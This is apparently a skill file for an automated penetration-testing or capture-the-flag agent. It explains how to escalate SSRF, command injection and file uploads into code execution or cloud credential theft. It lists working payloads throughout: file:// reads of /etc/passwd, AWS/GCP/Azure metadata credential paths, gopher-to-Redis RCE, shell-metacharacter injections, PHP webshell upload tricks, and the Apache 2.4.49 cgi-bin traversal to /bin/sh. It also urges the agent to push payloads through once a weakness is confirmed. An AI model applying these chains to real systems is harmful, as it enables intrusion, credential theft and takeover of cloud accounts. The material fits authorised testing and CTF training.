# chain-ssrf-to-rce — when to use

This skill covers the family where a **server-side request, fetch, or shell-out on user-supplied input** is turned into reading files, reaching internal-only services, extracting cloud credentials, or executing commands on the host. It routes here in three closely related shapes: (a) the server fetches a URL you control (classic SSRF), (b) the server passes your input to a shell command (command injection via a ping/diagnostic/validation feature), and (c) the server saves+serves an uploaded file or relays a request between co-located services so your input lands in an execution context. Treat any one as the trigger. The job is to walk a chain from a confirmed read/request/shell primitive through to code execution or credential theft — not to leave it as a low/medium finding.

## Dispatch when:

- **A form field whose value is a URL the server fetches for you.** An `<input type="url">`, or any parameter such as `url=`, `uri=`, `dest=`, `redirect=`, `next=`, `feed=`, `image_url=`, `profile_picture_url=`, `webhook=`, `callback=`, `target=`, `proxy=`, `fetch=`, `domain=`, `host=`, `endpoint=`, or a `redirect.php?url=` style endpoint. Confirm the *server* (not your browser) makes the request: a fetch error like `Failed to fetch image from URL` for a dead host, `Error fetching the URL: <urlopen error [Errno 111] Connection refused>` for a closed port, or an OAST/collaborator callback firing with the target's egress IP (`?url=http://<collaborator>.oast.site/`).
- **That same URL field accepts non-`http` schemes.** `url=file:///etc/passwd` returning file contents (often saved to and re-served from a path like `/static/uploads/<basename>`) makes the SSRF a local-file-read primitive — escalate straight to reading source/env/flag files. `gopher://`, `dict://`, `ftp://`, or CRLF/raw-byte control lets you speak raw TCP to internal services (Redis, Memcached, FastCGI, internal HTTP) — the strongest SSRF→RCE bridge.
- **Pointing the SSRF at `http://127.0.0.1:<port>` returns different content, status, or timing across ports.** An internal service is listening → enumerate internal ports. Look especially for `6379` (Redis), `11211` (Memcached), `9200` (Elasticsearch), `2375/2376` (Docker API), `9000` (FastCGI/PHP-FPM), or internal admin APIs on `8080/8500/etc.` answering without auth — each is an RCE pivot.
- **Cloud metadata is reachable through the SSRF.** `http://169.254.169.254/latest/meta-data/`, `http://metadata.google.internal/computeMetadata/v1/...`, or the Azure `http://169.254.169.254/metadata/instance?api-version=...` returning anything other than a connection error (directory listing, token, JSON, or even a `403 Missing required header`). Dispatch immediately — IAM/instance credentials (`AccessKeyId`, `SecretAccessKey`, `Token`, GCP `access_token`, Azure bearer token) lead to lateral movement against the cloud control plane. Cloud fingerprints (`x-amz-*`, GCP LB cookies, Azure `x-ms-*`, ALB/ELB headers, EC2/ECS/Lambda/GCE/App Service tells) raise priority on this path.
- **A "ping / status / health / service-check" feature that takes a host or service name.** A `POST /ping` with `ip_address=`, a `POST /check_service` with `service_name=`, or any "Ping Result"/"Service Dashboard" page that shells out. If `127.0.0.1` returns real `2 packets transmitted, 2 received` ping output, the input is being concatenated into a shell command.
- **Command output appended to the page after a metacharacter.** Send `127.0.0.1; id` / `127.0.0.1 | id` / `127.0.0.1 $(id)` / backtick / newline (`%0A`). If the response shows the ping result **plus** `uid=0(root) gid=0(root)` (or any output not from ping), command injection is confirmed — inputs often run as **root**.
- **A blind diagnostic that returns a fixed verdict regardless of input.** If `127.0.0.1; id`, `127.0.0.1; true`, and `127.0.0.1; false` all return an identical `Host is reachable!` with no command output, treat it as *almost-blind* command injection — confirm out-of-band (write a file with `; id > static/marker.txt` then GET it back, or time-delay with `; sleep 5`) rather than dropping the lead.
- **An input-validation rejection that hints at a parser/shell behind it.** `Invalid input, please try again.` for `127.0.0.1; id` but a real result for `127.0.0.1`, or a disclosed regex like `Failed to parse ping output, expected format: '(.*?) packets transmitted, (.*?) received, ...'`. The validation is bypassable.
- **A URL-saver / link-validator that "checks the URL before saving."** Text like "We ensure your URLs are correct by checking them" / "Our service sends requests to the URLs you provide", an `/add_url` endpoint returning `{"message":"URL status was checked and returned 200 status..."}`. The server both fetches the URL (SSRF) **and** often shells out to validate it (command injection via `"; cmd #`).
- **An image-upload that claims to "verify the file structure and extension."** A JPG/PNG-only `/upload/` form on a PHP/Apache stack. If a `.php` (or `GIF89a`-prefixed polyglot) lands in a web-served directory and executes, the upload is an RCE primitive.
- **A CMS/framework REST endpoint that names an execution verb.** A `?rest_route=/` index exposing a namespace like `wp-abilities/v1` with an `abilities/{name}` *run* route, an OGNL/Struts `.action` endpoint, or any "run/execute/abilities/eval" route on a fingerprinted CMS → a known-CVE command-execution chain.
- **Recon reports a co-located internal service on a second port the target URL never reveals.** A note like `co-located ... service on port NNNN` (e.g. `:4455`, `:8080`, `:49554`), an `internal-service`/`flask_app`/`nginx` hostname, or a reverse-proxy relationship between containers. SSRF from the front-end into that internal service is the intended path; the flag usually lives in the internal one.

## Key techniques:

- **SSRF as file-read / internal-reach primitive.** Submit a benign external URL to confirm server-side egress, then pivot to `file://`, `http://127.0.0.1:<internalport>/`, `http://internal-service/`, and loopback-encoding bypasses (`127.0.0.1`, `localhost`, `[::1]`, `127.1`, `2130706433`, `0x7f000001`). The objective is usually behind the SSRF: a localhost-only `/admin`, an internal page, or a local file (`/etc/passwd`, app source revealing `import urllib.request`, `/proc/self/environ`, the flag file).
- **Localhost-restriction bypass.** When an admin area returns 403/redirect from outside but the app also has a URL-fetching feature, point the fetch at the app's own `http://127.0.0.1/admin`. The server makes the request from localhost, bypassing IP allow-lists / `X-Forwarded-For` trust, and the admin HTML comes back in the response. (Example: `POST /convert url=http://127.0.0.1:65464/admin` returns the admin page; closed ports return the `Errno 111 Connection refused` fetch error.)
- **Cloud metadata → credential theft.** IMDSv1: `.../latest/meta-data/iam/security-credentials/` returns a role name, then `.../security-credentials/<role>` returns the `AccessKeyId`/`SecretAccessKey`/`Token` JSON. IMDSv2: `.../latest/api/token` needs an `X-aws-ec2-metadata-token-ttl-seconds` PUT — use header injection / gopher to set it. GCP: `.../instance/service-accounts/default/token` needs `Metadata-Flavor: Google`; a bare request returns `403 Missing Metadata-Flavor`, which itself confirms reachability.
- **Internal-service protocol tells.** `http://127.0.0.1:6379/` → `-ERR wrong number of arguments` / `-DENIED Redis is running in protected mode` (Redis reachable). `http://127.0.0.1:9200/` → `{"cluster_name":...,"version":{"number":...}}` (Elasticsearch, often scriptable). `http://127.0.0.1:2375/version` → JSON with `ApiVersion`/`Os`/`Arch` (unauthenticated Docker API → trivial host RCE). Timeout vs instant-error banner distinguishes open vs closed ports for blind scans.
- **Gopher → Redis RCE bridge.** `gopher://127.0.0.1:6379/_<URL-encoded RESP commands>` setting `dir`/`dbfilename` to a webroot or cron path then `SAVE`, or `SLAVEOF`/`MODULE LOAD` → command execution. A `+OK` echoed back through the SSRF response confirms commands landed. Containerised/microservice meshes where backends trust each other unauthenticated are prime targets (Redis, Elasticsearch scripting, Docker daemon `/containers/create` + host bind-mount, Kubernetes/cloud-init endpoints).
- **Multi-service SSRF chains (front-end → internal service → execution).** When the goal lives on a different container reachable only from the front-end: find the SSRF/relay primitive (`/api/set?url=`, a reverse proxy), point it at the internal `flask_app:8080` / `internal-service` / loopback port, and deliver the execution payload (script injection, e.g. `{"script":"open('/FLAG.txt').read()"}`) through that relay.
- **Command injection through a diagnostic feature.** A `ping`/`service-check`/`url-validator` shelling out is the single most common RCE surface. Confirm with a metacharacter appended to a valid host, watch for extra output (or out-of-band file-write / time delay when blind), then read the flag with `; cat /FLAG.txt`. For an arg-splicing CLI (`POST /check_service {"service_name":"-t custom \"cat /app/FLAG.txt\""}` → `{"status":"FLAG{...}true"}`) the input lands in the command's arguments. For a validator shell, break out: `url=http://example.com"; cat flag.txt #`.
- **Upload-to-RCE on a PHP image-storage app.** "We verify file structure and extension" + a web-served `/upload/` directory = upload a PHP webshell (extension trick: `.phP`, `.php5`, `.phtml`; or a `GIF89a`-magic-byte polyglot to pass `getimagesize`). Once it executes as `www-data`, a "check environment variables" hint points to `getenv('FLAG')`.
- **Known-CVE command execution on a fingerprinted stack.** Apache `2.4.49`/`2.4.50` `cgi-bin` + `mod_cgi` → path-traversal-to-RCE (`GET /cgi-bin/.%2e/.%2e/.%2e/.%2e/usr/bin/id`, then POST `echo Content-Type: text/plain; echo; <cmd>` to `/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh` with `--path-as-is`). Struts/OGNL `.action` → `%{7*7}` then `%{@java.lang.System@getProperty('user.dir')}`, a `ProcessBuilder` payload, or `Files.readString("/tmp/flag")`. WordPress `wp-abilities/v1` *run* route → the abilities-API execution CVE (needs a valid ability name).

## When NOT to use / easily confused with:

- **SSRF not yet confirmed.** A suspected-but-unproven URL parameter is a job for SSRF discovery, not this chain. The SSRF/command-injection/upload tell must be confirmed first; once it is, this is a high-confidence dispatch — push the payload through, do not re-enumerate.
- **A reflected or 302-redirecting URL parameter is open-redirect / reflected XSS, not SSRF.** SSRF requires the *server* to make the request. If the `?url=` value only appears in the HTML, in a `Location:` header, or in an `<a href>`, route to open-redirect/XSS. Confirm true SSRF with a connection-refused/fetch-failure error for a server-side-only host or by reaching a port your client cannot.
- **A value merely reflected in the page is XSS, not RCE,** unless the server *fetches it* (SSRF) or *executes it* (command injection / template eval). `Ping Result for 127.0.0.1; id` echoing your input with **no** appended command output is just reflection; only when `uid=...`/extra output appears, or a `file://` fetch returns file contents, does this skill apply.
- **`{{7*7}}` rendering as `49` is SSTI** — hand it to the template-injection specialist. OGNL `%{7*7}` on a Struts `.action` lives here because it is the known-CVE command-execution path; a generic Jinja/Twig `{{}}` reflection routes to SSTI first, and only escalates here once the eval is shown to reach `Runtime.exec`/`os.system`.
- **A plain file upload with no execution is the insecure-file-uploads / stored-XSS skill.** This skill owns the upload only when the file lands in a web-executed directory and runs code. If it is served as a static asset (image/SVG), route elsewhere.
- **`file://` read / LFI/RFI and XXE are their own classes.** Pure file disclosure or XML external entity goes to its dedicated skill; this skill is the SSRF→internal-service→RCE / SSRF→metadata→credential / shell-injection chain. (A `file://` *via the SSRF fetcher* still belongs here as the file-read primitive.)
- **A directly-exposed internal service is not an SSRF chain.** If Redis (or any service) answers on the public IP, that is a direct unauthenticated-service exploit. This applies only when the internal service is reached *through* the SSRF primitive.
- **Generic front-end command-injection / template-injection** (an `eval`'d parameter, `${...}` evaluated directly) is direct RCE/SSTI. Use the SSRF→RCE chain only when execution is obtained by pivoting through an internal/cloud service via the confirmed SSRF.
- **A fully sandboxed fetcher** (egress-filtered, link-local blocked, no internal listeners, scheme-locked to `https`) yields SSRF but no RCE pivot — report the SSRF. Still attempt metadata/internal probes once before concluding, since filtering is often incomplete.
- **SSRF and command-injection can co-exist on the same field — try both.** A URL-validator may both fetch the URL (SSRF) and shell out to validate it; do not stop at the first confirmed primitive if the flag is not yet read.
